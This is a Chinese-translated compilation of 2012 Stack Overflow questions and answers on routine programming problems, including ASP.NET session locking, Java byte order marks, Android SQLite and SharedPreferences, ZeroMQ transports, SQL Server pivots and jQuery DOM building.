> 软输入法上的按键不需要触发此侦听器中的方法，实际上不鼓励这样做。默认的 android 键盘不会为针对 Jelly Bean 或更高版本的任何应用程序的任何键触发这些，并且只会为针对 Ice Cream Sandwich 或更早版本的应用程序的某些按键提供它。

# c# - MVC 新窗口瓶颈

> ID：12820592
> 
> 赞同：2
> 
> 时间：2012-10-10T13:31:26.017
> 
> 标签：c#, .net, asp.net-mvc-3, new-window

我遇到了一个以前没有的奇怪问题，我想我会在这里询问是否有人有任何建议。

目前，我的应用程序有一个区域可以创建一个新的“录音” *（它在新窗口中使用 Flash 模块来录制音频）*，当录制完成时，用户提交表单并将所有音频数据发布到我的控制器。

此过程的持续时间可能取决于音频的大小，因此窗口将保持打开状态，直到上传完成然后关闭。

问题发生在上传过程中，如果用户上传录音并且在上传时尝试打开一个新窗口*（其中填充有“创建录音”视图）*并且新窗口内容的加载会停止，直到上传完成了。

如果我在实际上传其中一个之前为创建记录打开多个窗口，则整个过程工作正常，但是如果我开始上传一个然后尝试打开一个新窗口，那么它将“等待”上传操作完成之前填充新窗口内容。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T17:03:35.310

我认为您遇到了会话问题。

任何在有活动会话时提供的并且可以修改它的东西（即任何.Net 请求，但不是图像/css/等）都将获得会话对象的排他锁，直到请求完成。其他可以访问会话的请求将被排队，直到锁被释放。

更多信息[在这里](https://stackoverflow.com/questions/3629709/i-just-discovered-why-all-asp-net-websites-are-slow-and-i-am-trying-to-work-out)

可以通过指示某些请求只需要对会话状态进行只读访问来解决问题。有关完整详细信息，请参阅链接 Q 的答案。

[这里](http://msdn.microsoft.com/en-us/library/system.web.sessionstate.sessionstateutility.aspx)有一个自定义会话状态模块的实现，可以大大加快速度。它的工作原理是将会话信息缓存在内存中的哈希表中，然后告诉框架会话访问已完成。

请注意，这种方法存在潜在问题，如果 2 个页面几乎同时修改会话，则可能会导致竞争条件，以查看保留哪些修改 - 因此只有在您完全理解其含义时才这样做。

# java - 在 java 中读取文本文件的问题 - 结果列表中缺少行，尽管存在

> ID：12820598
> 
> 赞同：1
> 
> 时间：2012-10-10T13:31:42.487
> 
> 标签：java, file, file-io, character-encoding, inputstream

我现在遇到了一个有趣的问题。

我正在尝试阅读这个文件，其中包含按字母顺序排列的 1000 个最常见的英语单词，在 java 中：

[http://www.file-upload.net/download-6679295/basicVocabulary.txt.html](http://www.file-upload.net/download-6679295/basicVocabulary.txt.html)

这是文件开头的一个片段：

```
a
able
about
above
according
account
across
act
action
added
afraid
after 
```

我现在的问题是，虽然看起来我正在正确读取 txt 文件，但稍后在我的结果集/结果列表中缺少第一行。在这种情况下，这是字母“a”，因为它位于第一个位置。

为了让您能够重现我的问题，**请尝试使用上面的 txt 文件的示例代码**并亲自查看（不要忘记更新文件路径）。我在评论中添加了为我提供的控制台输出。

```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class MyWrongBehaviour {

public static void main(String[] args){
    MyWrongBehaviour wrong = new MyWrongBehaviour(); 

    List<String> list = wrong.loadLanguageFile(); 

    System.out.println("size of the list: " + list.size()); //Answer is 1000, that's the correct size

    for(String s : list){
        System.out.println(s); // "a" will appear, so it is somehow included
    }

    if(list.contains("a")){
        System.out.println("found \"a\""); // doesn't get written on the console, can't find it
    }

    for(String s : list){
        if(s.equals("a")){
            System.out.println("found \"a\""); // never gets written, can't find it
        }
    }

}

private List<String> loadLanguageFile() {
    List<String> result = null;
    try (InputStream vocIn = getClass().getResourceAsStream(
            "/test/basicVocabulary.txt")) {

        if (vocIn == null) {
            throw new IllegalStateException(
                    "InputStream for the basic vocabulary must not be null");
        }

        BufferedReader in = new BufferedReader(new InputStreamReader(vocIn,
                "UTF-8"));

        String zeile = null;

        result = new ArrayList<>();
        while ((zeile = in.readLine()) != null) {
            result.add(zeile.trim());
        }
    } catch (IOException e) {
        e.printStackTrace();
    }

    return result;
}

} 
```

有人知道为什么会发生这种情况以及我能做些什么来解决它吗？我的想法是可能存在字符集错误，尽管我将文件保存为 UTF-8，或者有某种不可见的字符损坏了文件，但我不知道如何识别它。

顺便说一句：我以前使用过 Hashset，但是使用 Set 时甚至没有添加第一行。现在它被添加了，但找不到它。

感谢您的每一个回答，并认为您正在与我分享。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-10T13:35:50.283

该文件以[字节顺序标记](http://en.wikipedia.org/wiki/Byte_order_mark)开始，表明它是 UTF-8，因此第一行实际上等同于“\ufeffa”（即两个字符，U+FEFF 然后是 'a'），然后*不*等于为“一”。

剥离它的一种方法是使用：

```
result.add(zeile.trim().replace("\ufeff", "")); 
```

更改后，您的代码按预期工作。在 Java 中删除字节顺序标记可能有更好的方法，但我不知道。

# android - Android 中 SQLITEDATABASE 中的语法错误

> ID：12820600
> 
> 赞同：0
> 
> 时间：2012-10-10T13:31:46.667
> 
> 标签：android, database

在我的数据库中，我想从我的数据库中检索一行。为此，我写了一个查询：

```
Cursor mCursor = db.query("Author_table", column_name, "Author_name=?" , params, null , null , null) ; 
```

通过这个我想做以下查询：“从 Author_table 中选择 AID，其中 Author_name = Sultan”。但是我在 android 的 SQLiteDatabase 中有一个异常。请建议我该怎么做？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:36:35.487

像这样的东西应该工作：

```
Cursor c = db.query("Author_table", new String[] {"AID"}, "Author_name=?", new String[] {"Sultan"}, null, null, null); 
```

# 编辑

SQLOpenHelper

```
import java.io.File;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.os.Environment;

public class OpenHelper extends SQLiteOpenHelper {

    private static final String DATABASE_NAME = "test.db";
    private static final int DATABASE_VERSION = 8;

    private static final String CREATE_TABLE_USER = "create table USER( "
            + "username varchar(256) not null, " + "sex varchar(1) not null, "
            + "password varchar(64) not null, " + "active int not null"
            + ");";

    public OpenHelper(Context context) {
        super(context, DATABASE_NAME, null, DATABASE_VERSION);
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        db.execSQL(CREATE_TABLE_USER);
    }

    @Override
    public void onOpen(SQLiteDatabase db) {
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {

        if (oldVersion < 8) {
            // db update goes here and in onCreate() (for newly installed apps)
        }
    }

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:33:32.707

将字符串值用单引号括起来。您的查询应如下所示

```
Select AID from Author_table where Author_name = 'Sultan'; 
```

代替

```
Select AID from Author_table where Author_name = Sultan; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T13:38:51.827

试试这个查询

```
Cursor cursor = db.query("Author_table", new String[] { "AID" },
                    "Author_name LIKE ?", new String[] { "%Sultan%" }, null, null,null); 
```

# richfaces - RichFaces 4 - 过滤扩展数据表的行数

> ID：12820607
> 
> 赞同：4
> 
> 时间：2012-10-10T13:32:11.460
> 
> 标签：richfaces

将过滤器应用于 ExtendedDataTable 后，我将如何检索显示给用户的新行数？

我试图将 ExtendedDataTable 绑定到支持 bean 中的 UIExtendedDataTable 对象，但我无法找到具有此值的方法/属性。我只能在过滤之前获得整个列表的行数。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T08:21:48.307

这里也一样，用jQuery写了一个纯javascript的解决方案，过滤完成后获取结果div类的行数。如果您找到更好的解决方案，请告诉我。

# linux - Fedora 17 上的 Wordnet 3.0 安装问题

> ID：12820609
> 
> 赞同：0
> 
> 时间：2012-10-10T13:32:25.373
> 
> 标签：linux, wordnet

我正在尝试在 Fedora 17 上安装 wordnet 3.0

我已经从他们的网站下载了 wordnet 3.0 的 tar.gz。

到目前为止，我已经成功执行了以下操作：

`tar xzf WordNet-3.0.tar.gz`
`cd WordNet-3.0.tar.gz`
`./configure`

以下是在控制台上创建的输出

```
`checking for gcc... gcc  
checking for C compiler default output file name... a.out  
checking whether the C compiler works... yes  
checking whether we are cross compiling... no  
checking for suffix of executables...  
checking for suffix of object files... o  
checking whether we are using the GNU C compiler... yes  
checking whether gcc accepts -g... yes  
checking for gcc option to accept ANSI C... none needed  
checking for ranlib... ranlib  
checking for a BSD-compatible install... /bin/install -c  
checking how to run the C preprocessor... gcc -E  
checking for egrep... grep -E  
checking for ANSI C header files... yes  
checking for sys/types.h... yes  
checking for sys/stat.h... yes  
checking for stdlib.h... yes  
checking for string.h... yes  
checking for memory.h... yes  
checking for strings.h... yes  
checking for inttypes.h... yes  
checking for stdint.h... yes  
checking for unistd.h... yes  
checking locale.h usability... yes  
checking locale.h presence... yes  
checking for locale.h... yes  
checking malloc.h usability... yes  
checking malloc.h presence... yes  
checking for malloc.h... yes  
checking for stdlib.h... (cached) yes  
checking for string.h... (cached) yes  
checking for stdlib.h... (cached) yes  
checking for GNU libc compatible malloc... yes  
checking for strchr... yes  
checking for strdup... yes  
checking for strrchr... yes  
checking for strstr... yes  
checking for strtol... yes  
checking for nl_langinfo and CODESET... yes  
checking whether build environment is sane... yes  
checking for gawk... gawk  
checking whether make sets $(MAKE)... yes  
checking for style of include used by make... GNU  
checking dependency style of gcc... gcc3  
checking for Tcl configuration... configure: WARNING: Can't find Tcl configuration   definitions` 
```

但是当我尝试执行“make”时，输出以下消息：

```
`make: *** No targets specified and no makefile found.  Stop.` 
```

有人知道可能是什么问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-11T11:36:47.073

它在安装 tk8.4-dev 和 tcl-8.4-dev 的开发包后工作

然后运行配置：

```
./configure --with-tk=/usr/lib/tk8.4/ --with-tcl=/usr/lib/tcl8.4/ 
```

（来自帖子的提示： http: [//shalini-gupta.livejournal.com/42017.html](http://shalini-gupta.livejournal.com/42017.html)）

# android - 在哪里存储可以被任何 android 活动使用的 jsonArray？

> ID：12820610
> 
> 赞同：1
> 
> 时间：2012-10-10T13:32:30.003
> 
> 标签：android, arrays

我发布了一些代码来了解可以在任何活动中全局使用哪个数组，并且在任何活动中都可能需要该数组。

```
 Intent intent          =   getIntent();
     JSONArray beaconsArray     =   null;
     String jsonArray       =   intent.getStringExtra("activeBeaconsArray");
     try 
        {
            beaconsArray = new JSONArray(jsonArray);
            System.out.println(beaconsArray.toString(2));
        } 
     catch (JSONException e) { e.printStackTrace();} 
```

我应该将 beaconsArray 存储在单独类中的任何静态数组变量中，以便我可以在任何需要的地方使用它，还是应该将父类作为所有需要此数组的类的超类（beaconsArray）？
我不想一次又一次地从数据库中获取它！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:35:06.893

创建一个扩展[Application](http://developer.android.com/reference/android/app/Application.html)类的类并将您的数据添加到其中。您添加到其中的任何数据都将保留到应用程序结束。

一个很好的例子可以在这里找到，

[使用 Android Application 类来持久化数据](https://stackoverflow.com/q/4208886/603744)

[http://www.helloandroid.com/tutorials/maintaining-global-application-state](http://www.helloandroid.com/tutorials/maintaining-global-application-state)

或者您可以选择 Sharedperefernce。但是您必须了解添加到它们的数据是持久的，除非您覆盖它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-10T13:40:21.327

`SharedPreference`是这类任务的首选，下面给出一些实用的方法来`JSONArray`保存`SharedPreference`

```
public static void saveJSONArray(Context c, String prefName, String key, JSONArray array) {
    SharedPreferences settings = c.getSharedPreferences(prefName, 0);
    SharedPreferences.Editor editor = settings.edit();
    editor.putString(JSONSharedPreferences.PREFIX+key, array.toString());
    editor.commit();
}

public static JSONArray loadJSONArray(Context c, String prefName, String key) throws JSONException {
    SharedPreferences settings = c.getSharedPreferences(prefName, 0);
    return new JSONArray(settings.getString(JSONSharedPreferences.PREFIX+key, ""));
} 
```

# c# - 如何使用模仿多部分请求的 AJAX 将图像（其二进制版本）上传到服务器？

> ID：12820615
> 
> 赞同：0
> 
> 时间：2012-10-10T13:32:43.837
> 
> 标签：c#, javascript, jquery, ajax, multipartform-data

在我的应用程序中，如果用户单击按钮截取屏幕截图，`activeX`则会调用控件中的一个方法，该方法截取屏幕截图，将其转换为字节（**64 位编码字符串**），并且我能够访问该 64 位javascript中编码的字符串，我用它来向用户展示图像的预览（标签的`src`属性是用字符串设置的）。`img`

现在，当用户单击预览的“**保存**”按钮时，我希望使用`ajax`. 现在，问题是我只有文件的二进制字符串，但我想将图像作为`multipart`请求发送（就好像它是使用上传的一样`<input type="file"/>`。任何可能的方法？唯一的条件是图像应该作为`multipart`请求发送，以便我可以使用在服务器上处理分段上传的标准技术接收它。

我也可以使用特定于 IE 的解决方案:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:56:33.970

您不能通过 AJAX 发送多部分信息，但您可以解决这个问题。您在页面上制作表格：

```
<form name="img_form" target="img_iframe" action="..." method="..." enctype="multipart/form">
</form>

<iframe name="img_iframe" id="img_iframe"></iframe> 
```

在将加载到 img_iframe 中的返回数据中，您可以使用隐藏字段或指向新文件的链接设置各种返回值。

您可以像这样设置 onLoad 事件：

```
$('iframe#img_iframe').on('load', function(event) {
    var iframe_content = ($.browser.msie ? $(event.target.contentWindow.document) : $(event.target.contentDocument));

    /* Do Stuff */
}); 
```

这是假设您知道如何设置要在表单中提交的正确数据。

# bash - 将 nohup 的标准错误重定向到 nohup.out

> ID：12820616
> 
> 赞同：18
> 
> 时间：2012-10-10T13:32:46.507
> 
> 标签：bash, shell, stdout, stderr, nohup

如何运行命令以`nohup`将stdout 和 stderr*都*保存到`nohup.out`？默认情况下，仅保存 stdout 并丢弃 stderr。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-10-11T05:23:40.557

试试这个

```
nohup 2>&1 Ex.exe & 
```

# tcp - 如何在不同 Goroutine 中的 ZeroMQ 上下文之间进行通信？

> ID：12820618
> 
> 赞同：4
> 
> 时间：2012-10-10T13:32:51.100
> 
> 标签：tcp, go, ipc, zeromq, inproc

我将[它用作样板文件](http://zguide.zeromq.org/go%3amsgqueue)，除了在同一个程序中我还有一些 goroutines 作为工作程序并连接到后端端点 tcp://127.0.0.1:5560。

我想做的是让它通过更有效的方式连接，例如 ipc://、inproc://，甚至是 unix 套接字。我已经尝试过这些，但没有奏效。ZeroMQ 不能使用 Channels 吗？

那么如何在没有 tcp 的情况下将不同的 goroutine 与 ZeroMQ 上下文连接起来呢？有更好的选择吗？

**更新**：代码：

```
// Simple message queuing broker
// Same as request-reply broker but using QUEUE device
//
// Author:  Brendan Mc.
// Requires: http://github.com/alecthomas/gozmq

package main

import (
    zmq "github.com/alecthomas/gozmq"
)

func startWorker() {
    context, _ := zmq.NewContext()
    defer context.Close()

    worker, _ := context.NewSocket(zmq.REP)
    //err := worker.Connect("ipc:///backend")  // Tried it, but nothing
    //err := worker.Connect("inproc:///backend")  // Tried it, but nothing
    err := worker.Connect("tcp://127.0.0.1:5560") // this works
    if err != nil {
        fmt.Println(err)
    }

    for {
        data, err := worker.Recv(0)
        fmt.Println(string(data))
        worker.Send([]byte("I got your data"), 0)
    }
}

func main() {
    context, _ := zmq.NewContext()
    defer context.Close()

    // Socket facing clients
    frontend, _ := context.NewSocket(zmq.ROUTER)
    defer frontend.Close()
    frontend.Bind("tcp://*:5559")

    // Socket facing services
    backend, _ := context.NewSocket(zmq.DEALER)
    defer backend.Close()
    //backend.Bind("ipc:///backend")  // Tried it, but nothing
    //backend.Bind("inproc:///backend")  // Tried it, but nothing
    backend.Bind("tcp://*:5560") // this works

    for i := 0; i < 4; i++ {
        go startWorker() // Start workers in a separate goroutine
    }

    // Start built-in device
    zmq.Device(zmq.QUEUE, frontend, backend)

    // We never get here…
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-11T17:34:48.097

为了使用`inproc://`传输，所有套接字都需要共享相同的上下文（这是线程安全的）。

此外，如果您使用相同的上下文，则 ZMQ 不需要任何后端 I/O 线程

您没有提及您在哪个操作系统下运行，但`ipc://`传输仅在大多数 *nix 下可用。在 Windows 下，您只能使用以下传输：tcp://、inproc://、pgm://。查看[zmq_connect](http://api.zeromq.org/2-1%3azmq-connect)文档以获取更多信息。

# spring - 如何在 Springs Web Flow 项目中使用 dijit 和 dojo 使我的输入字段发光

> ID：12820620
> 
> 赞同：0
> 
> 时间：2012-10-10T13:33:00.430
> 
> 标签：spring, spring-mvc, dojo, spring-webflow

我正在开发一个 Spring Web Flow 项目，我想使用 Dojo dijit css 使我的输入表单和字段变得更好。我想让我的领域发光。

在我的 JSP 之上有以下内容：

```
<script type="text/javascript" src="<c:url value="/resources/dojo/dojo.js" />"> </script>
<script type="text/javascript" src="<c:url value="/resources/spring/Spring.js" />"> </script>
<script type="text/javascript" src="<c:url value="/resources/spring/Spring-Dojo.js" />"> </script>

<link type="text/css" rel="stylesheet" href="<c:url value="/resources/dijit/themes/claro/claro.css" />" /> 
```

但是如何更改我的 Spring 表单：输入标签以使用它们并发光？

有人可以告诉我如何更改以下内容

```
<form:input tabIndex="3"  maxLength="15" size="16" path="first_name" /> 
```

所以它会发光...谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T17:21:12.447

我不确定您所说的“发光”是什么意思，但是要使用 dojo css，您需要添加如下内容：

```
<script type="text/javascript">
    Spring.addDecoration(new Spring.ElementDecoration({
        elementId : "first_name",
        widgetType : "dijit.form.ValidationTextBox",
        widgetAttrs : { required : true }}));
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:19:42.587

我错过了

```
<body class="claro"> 
```

# sql-server - SQL Server 数据透视平均值

> ID：12820627
> 
> 赞同：1
> 
> 时间：2012-10-10T13:33:32.177
> 
> 标签：sql-server, sql-server-2008, sum, pivot, average

我有一个 Microsoft SQL 服务器数据透视查询，它获取每个类别的行和每月列 1 到 12 的值的总和

我目前在查询中返回了 13 列，例如，4 月之后没有数据：

```
 Category  [1]   [2]   [3]   [4]   [5]   [6]   [7]   [8]   [9]   [10]   [11]   [12]
 -----------------------------------------------------------------------------------
 Food      150   200   0     125   null  null  null  null  null  null   null   null  
 Drink     140    0     90   115   null  null  null  null  null  null   null   null 
```

对于每个类别，我需要添加值的总和，以及忽略没有数据的月份的平均值。对于上面的数据，我需要添加列：

```
 Sum   Average
 475    118.75
 345     86.25 
```

我尝试了许多不同的方法，但我找不到方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T14:50:58.113

这个查询怎么样？

```
Select *
From
(
    Select ItemName as Itm, [1],[2],[3],[4],[5],[6],[7],[8],[9],[10],[11],[12] 
    From
    (
        Select ItemName, Month(EffectiveDate) as Mon, Val
            From Items

    ) as SourceTable
    Pivot
    (
        Sum(Val)
        For Mon in ([1],[2],[3],[4],[5],[6],[7],[8],[9],[10],[11],[12])
    ) as PivotTable
) A
Cross Apply (Select SUM(Val) as SumVal, AVG(Val) as AvgVal From Items i Where i.ItemName = a.Itm) b 
```

见图片：

[http://s18.postimage.org/lwbovyy49/results.jpg](http://s18.postimage.org/lwbovyy49/results.jpg)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T14:47:38.277

我知道这看起来很愚蠢，但它会成功。:-)

```
Select Category,(isnull(f1,0)+isnull(f2,0)+isnull(f3,0)) as sumall,
isnull((isnull(f1,0)+isnull(f2,0)+isnull(f3,0)),1)/isnull(nullif((0+(isnull(nullif(isnull(f1,isnull(f1,0)),f1),1))+(isnull(nullif(isnull(f2,isnull(f2,0)),f2),1))+(isnull(nullif(isnull(f3,isnull(f3,0)),f3),1))),0),1) as avr
from MyTable 
```

# php - PHP 在 RSS 提要中附加所有 URL

> ID：12820631
> 
> 赞同：1
> 
> 时间：2012-10-10T13:33:49.770
> 
> 标签：php, string, rss, replace, append

我正在尝试使用额外的字符串（如“/testing123”等）在 RSS 提要中附加所有 url。来自 RSS 的原始 url 格式如下所示：

```
<link rel="alternate" type="text/html" href="http://website.com/item/name1/2162561"/>
<link rel="alternate" type="text/html" href="http://website.com/item/name2/2162435"/> 
```

等等，我在 for 循环中使用了带有 str_replace 的正则表达式，但我似乎无法让它正常工作，如果我使用 preg_replace 我会出错。当我只是回显带有附加字符串的网址时，它会显示我想要的方式，但是当我使用 str_replace 时，网址看起来像这样：

```
http://website.com/testing123/item/name1/2162561
http://website.com/testing123/item/name2/2162435 
```

当它们被替换时，我需要在末尾带有附加字符串的 url，但是像这样：

```
<link rel="alternate" type="text/html" href="http://website.com/item/name1/2162561/testing123"/>
<link rel="alternate" type="text/html" href="http://website.com/item/name2/2162435/testing123"/> 
```

我的代码是：

```
<?php 

// The append string
$append = '/testing123';

// The file
$file = "RSS.txt";

// Get the files contents
$contents = file_get_contents($file);

// The search pattern
$SearchPattern = '/href=["|\'](.[^"|\']+)/i';

// Run preg_match_all to grab all the Matches
preg_match_all( $SearchPattern, $contents, $Matches );

// Check to see if we have at least 1 match
$MatchCount = count($Matches[0]);

// If there is more than 1 match then run a for loop
if ( $MatchCount > 0 ) {
     for ( $i=0; $i < $MatchCount ; $i++ ) {

          $temp = $Matches[0][$i];
          echo $temp . $append . '<br />'; // Appears to work

          //$contents = str_replace($temp, $temp . $append, $contents); // But str_replace doesn't seem to work

          //preg_replace($temp, $temp . $append, $contents); // And using preg_replace gives a error

     };
};

echo $contents; // Display the contents

?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T14:31:22.900

**您可以使用XPath**和**DOMDocument**代替 preg 匹配/替换

 **```
$html = <<< EOF
<xml>
  <items>
    <item>
      <link href="/testing/123" />
      <link href="http://test" />
      <font><tag>x</tag></font>
    </item>
  </items>
</xml>
EOF; 
```

当然，示例 XML 是荒谬的。下面的代码检查相对链接，并使它们成为绝对链接。

```
$doc = new DOMDocument();
@$doc->loadXML( $html );
$xpath = new DOMXpath( $doc );

$links = $xpath->query( "//link" );
for( $i = 0; $i < $links->length; $i++ ) {
    $href = $links->item($i)->getAttribute( 'href' );
    if( substr($href, 0, 4) != 'http' ) { 
        $links->item($i)->setAttribute( 'href', "http://" . ltrim($href, '/') );
    }
}

echo $doc->saveHTML(); 
```

吐出转换后的 HTML：

```
<xml>
<items>
<item>
<link href="http://testing/123">
<link href="http://test">
<font><tag>x</tag></font>
</item>
</items>
</xml> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:39:23.443

您需要另一个变量来保存 $temp 数组。

所以

$match[i] = $temp 。$追加；

然后回显 $match 稍后（在 for 循环或每个循环中）

或将匹配保留为字符串并
附加

```
// If there is more than 1 match then run a for loop

if ( $MatchCount > 0 ) {
     for ( $i=0; $i < $MatchCount ; $i++ ) {

          $temp = $Matches[0][$i];
          $match .= $temp . $append . '<br />'; // Appears to work

          //$contents = str_replace($temp, $temp . $append, $contents); // But str_replace doesn't seem to work

          //preg_replace($temp, $temp . $append, $contents); // And using preg_replace gives a error

     };
};

echo $match; // Display the contents

?> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-10T14:25:38.173

这应该工作：

```
<?php 

// The append string
$append = '/testing123';

// The file
$file = "RSS.txt";

// Get the files contents
$contents = file_get_contents($file);

// The search pattern
$SearchPattern = '/(<link .* href=".*)("\/>)/i';

// Run preg_match_all to grab all the Matches
preg_match_all( $SearchPattern, $contents, $matches );

for($i=0;$i<count($matches[1]);$i++){
    echo $matches[1][$i].$append.$matches[2][$i]."\n";
}

?> 
```

基本上，它使用正则表达式过滤行并提取要附加文本的索引两侧。

然后它将所有内容连接起来。**

# google-maps - 骨干事件未触发 - Google Maps InfoBubble

> ID：12820632
> 
> 赞同：1
> 
> 时间：2012-10-10T13:33:51.280
> 
> 标签：google-maps, backbone.js

我正在尝试通过单击 Google Map 内的 Google Infobubble 内的点击来触发事件。

```
class MapSite.Views.Maps extends Backbone.View

  events:
    'click [name=testdrive]' : 'initControls'

  initialize: ->
    @render()

  render: ->
    @el = $("#map")  
    $this = $(this.el)
    @loadMap()

  initControls: ->
    alert "hello"

  loadMap: ->
    osmMapType = new google.maps.ImageMapType(
      getTileUrl: (coord, zoom) ->
        "http://tile.openstreetmap.org/#{zoom}/#{coord.x}/#{coord.y}.png"
      tileSize: new google.maps.Size(256, 256)
      isPng: true
      alt: "OpenStreetMap layer"
      name: "OSM"
      maxZoom: 19
    )

    cloudMadeMapType = new google.maps.ImageMapType(
      getTileUrl: (coord, zoom) ->
        "http://b.tile.cloudmade.com/****/54912/256/#{zoom}/#{coord.x}/#{coord.y}.png"
      tileSize: new google.maps.Size(256, 256)
      isPng: true
      alt: "CloudMade layer"
      name: "CMade"
      maxZoom: 13
    )

    lat = 51.503
    lng = -0.113
    latlng = new google.maps.LatLng(lat, lng)
    options =
      zoom: 10
      center: latlng
      mapTypeId: 'OSM'
    @gMap = new google.maps.Map(document.getElementById("map"), options)
    @gMap.mapTypes.set('OSM', osmMapType)
    @gMap.mapTypes.set('CloudMade', cloudMadeMapType)
    @gMap.setMapTypeId('CloudMade')

    @initShape()
    @initLabel()

initLabel: ->
    console.log("This is where the label should appear")
    initLabel = new InfoBubble(
      position: new google.maps.LatLng(51.44115356738888, 0.14849636779354114)
      maxWidth: 240
      maxHeight: 210
      shadowStyle: 1
      padding: 0
      content: '<div class="tooltip_header"><h4>Hello</h4></div><div class="tooltip_content"><p>Nunc nec, egestas vel augue rhoncus massa cras, tincidunt a nisi nisi est lundium non sed? Eros pulvinar</p></div> <div id="tooltip_buttons" class="tooltip_buttons"><button class="btn btn-success" name="testdrive">Test Drive</button> <button class="btn btn-warning">Read More</button></div>',
      tabPadding: 12
      backgroundColor: 'black'
      borderRadius: 0
      arrowSize: 10
      borderWidth: 0
      borderColor: '#AB2424'
      disableAutoPan: true
      hideCloseButton: false
      arrowPosition: 0.5
      backgroundClassName: 'phoney'
      tabClassName: 'tabClass'
      activeTabClassName: 'activeTabClass'
      arrowStyle: 2
      )

    initLabel.open(@gMap) 
```

结尾

地图加载得很好，信息气泡在那里。然后我尝试将一个事件链接到它被点击，但它没有触发。我已将 el 设置为“#map”，并且 infobubble 的 div 位于地图 div 内。

基本上，我最终需要的是一个事件，当单击信息气泡内的按钮时，该事件会被触发。我认为这可能是因为 Backbone 没有看到信息气泡，因为它是在之后加载的，所以无法自行连接？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:44:24.313

默认情况下，主干视图中的事件`el`使用*事件委托*绑定到根。因为你正在改变你的`el`事后“丢失”的事件。

您可以尝试做的是使用*delegateEvents方法重新*[委托](http://documentcloud.github.com/backbone/#View-delegateEvents)您的事件。

顺便说一句，我看到您正在缓存`$(this.el)`，这不再是必需的，因为您现在可以使用[$el](http://documentcloud.github.com/backbone/#View-%24el)代替（我认为从主干.js 0.9.2 开始）。

# jquery - 使用 jQuery 追加一个 div，然后将更多项目追加到没有 ID 的新 div 中

> ID：12820633
> 
> 赞同：4
> 
> 时间：2012-10-10T13:33:52.670
> 
> 标签：jquery

我需要使用 jQuery 将一个带有“地址行”类的 div 附加到另一个 id 为“add-results”的元素，然后将几个元素添加到新创建的 div 中。然后对对象的每个项目重复此操作。

这就是我想要得到的结果：

```
<div id="add-results">    
  <div class="address-line">
    <h2>title 1</h2>
    <p>desc 1</p>
    <img src="thing1.png" />
  </div>
  <div class="address-line">
    <h2>title 2</h2>
    <p>desc 2</p>
    <img src="thing2.png" />
  </div>
  <!-- etc repeated on a loop -->
</div> 
```

这是我尝试过的许多事情之一（chdata 是对象，chvalue 将保存数据）：

```
$.each(chdata, function(name, chvalue) {
  $('#add-results').append('<div class="address-line">');
  $('#add-results').append('<h2>'+chvalue['title']+'</h2>');
  // etc.. adding paragraph, an image, some links.
}); 
```

..但这当然会导致：

```
<div id="add-results">
  <div class="address-line"></div>
  <h2>title 1</h2>
  <p>desc 1</p>
  <img src="thing1.png" />
  <div class="address-line"></div>
  <h2>title 2</h2>
  <p>desc 2</p>
  <img src="thing2.png" />
</div> 
```

我也尝试过使用：

```
$('#add-results').append('<div class="address-line">')
.append('<h2>'+chvalue['title']+'</h2>'); 
```

..但同样的结果。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-10T13:36:36.150

你可以使用`.appendTo`方法。

```
$.each(chdata, function(name, chvalue) {    
  $('<div class="address-line">')
    .append('<h2>'+chvalue['title']+'</h2>')
    // etc.. adding paragraph, an image, some links.
    .appendTo('#add-results'); // at last appendTo the #add-results
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-10T13:36:02.643

存储新的 div 并引用*它，*而不是重复使用 append。`.append`将返回您要附加的原始元素，而不是附加的项目。尝试这样的事情：

```
var newdiv = $('<div>',{'class':'address-line'});
newdiv.append(...);
$('#add-results').append(newdiv); 
```

已组装（我更喜欢利用 jQuery 和该`.text`方法而不是传递原始 HTML，以防该值包含可能破坏 HTML 的内容，但对每个人都是他/她自己的）：

```
$.each(chdata, function(name, chvalue) {
  // Create and store your new div
  var div = $('<div>',{'class':'address-line'});

  // append the new elements to it
  $('<h2>').text(chvalue['title']).appendTo(div);
  $('<p>').text(chvalue['description']).appendTo(div);
  $('<img>',{'src':chvalue['image']}).appendTo(div);

  // insert that new div into #add-results
  div.appendTo('#add-results');
}); 
```

# facebook - Facebook：检索应用程序的操作

> ID：12820638
> 
> 赞同：0
> 
> 时间：2012-10-10T13:34:06.113
> 
> 标签：facebook, action

iHeartradio facebook 应用程序在我的时间线上发布操作说

Syed 在 iHeartRadio 上竖起了大拇指 Pee loon。

我可以在我的应用程序代码中通过 facebook graph api 获取 iheartradio 发布的这些操作吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T15:06:47.300

是的。您只需要从该应用的命名空间请求用户操作的特定权限。

1.  从您或朋友的时间线活动日志中查找该应用的故事
